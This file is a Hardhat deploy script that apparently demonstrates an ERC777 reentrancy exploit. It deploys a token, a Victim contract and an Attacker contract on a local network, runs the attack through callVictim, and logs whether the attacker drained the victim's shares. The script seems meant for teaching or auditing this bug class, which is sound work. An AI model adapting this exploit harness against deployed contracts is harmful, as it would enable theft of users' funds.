import { DeployFunction } from "hardhat-deploy/dist/types";
import { DeploymentsExtension } from "hardhat-deploy/types";
import { HardhatRuntimeEnvironment } from "hardhat/types";
import { ethers } from "hardhat";
import { BigNumber } from "ethers";

const func: DeployFunction = async function (hre: HardhatRuntimeEnvironment) {
  const { deployments, getNamedAccounts } = hre as any;
  const { deploy } = deployments as DeploymentsExtension;
  const { deployer, exploiter } = await getNamedAccounts();
  const [, , exploiterSigner] = await (hre as any).ethers.getSigners();
  await deploy("ReEnter777", {
    from: deployer,
    args: [],
    log: true,
  });
  const erc777Deployment = await deployments.get("ReEnter777");
  const erc777 = await ethers.getContractAt(
    "ReEnter777",
    erc777Deployment.address
  );
  await deploy("Share", {
    from: deployer,
    args: [],
    log: true,
  });
  const shareDeployment = await deployments.get("Share");
  const share = await ethers.getContractAt("Share", shareDeployment.address);
  await deploy("Victim", {
    from: deployer,
    args: [erc777.address, share.address],
    log: true,
  });
  const victimDeployment = await deployments.get("Victim");
  const victim = await ethers.getContractAt("Victim", victimDeployment.address);
  await deploy("Attacker", {
    from: exploiter,
    args: [victim.address, erc777.address],
    log: true,
  });
  const attackerDeployment = await deployments.get("Attacker");
  const attacker = await ethers.getContractAt(
    "Attacker",
    attackerDeployment.address
  );
  await erc777.transfer(attacker.address, 500_000, { from: deployer });
  await erc777.approve(victim.address, 500_000);
  const sharesToWrap = BigNumber.from(10);
  await victim.createSharesForUser(deployer, 10);
  const initialDeployerBalance = await victim.shares(deployer);
  const initialAttackerBalance = await victim.shares(attacker.address);
  console.log("START ATTACK");
  const amountOfWithdrawalsToTrigger = sharesToWrap;
  console.log({
    initialAttackerTokenBalance: (
      await erc777.balanceOf(attacker.address)
    ).toString(),
    initialDeployerTokenBalance: (await erc777.balanceOf(deployer)).toString(),
    initialDeployerBalance: initialDeployerBalance.toString(),
    initialAttackerBalance: initialAttackerBalance.toString(),
  });
  await attacker
    .connect(exploiterSigner)
    .callVictim(deployer, 1, amountOfWithdrawalsToTrigger, {
      from: exploiter,
    });
  const attackerShareProfit = (
    await victim.shares(attacker.address)
  ).toString();
  const victimShareLoss = (await victim.shares(deployer))
    .sub(initialDeployerBalance)
    .abs();
  console.log({
    finalAttackerTokenBalance: (
      await erc777.balanceOf(attacker.address)
    ).toString(),
    finalDeployerAttackerTokenBalance: (
      await erc777.balanceOf(deployer)
    ).toString(),
    attackerShareProfit,
    victimShareLoss: victimShareLoss.toString(),
    attackerWrappedShareBalance: (
      await victim.wrappedShares(attacker.address)
    ).toString(),
    victimsRemainingShares: (await victim.shares(deployer)).toString(),
  });
  const wrappedShares = await victim.wrappedShares(attacker.address);
  const attackerWins =
    wrappedShares.gt(BigNumber.from(0)) && wrappedShares.eq(victimShareLoss);
  console.log("END ATTACK");
  console.log(
    `\n\n===============${
      attackerWins ? "ATTACK WINS" : "ATTACKER LOSES"
    }===============\n\n`
  );
};
export default func;
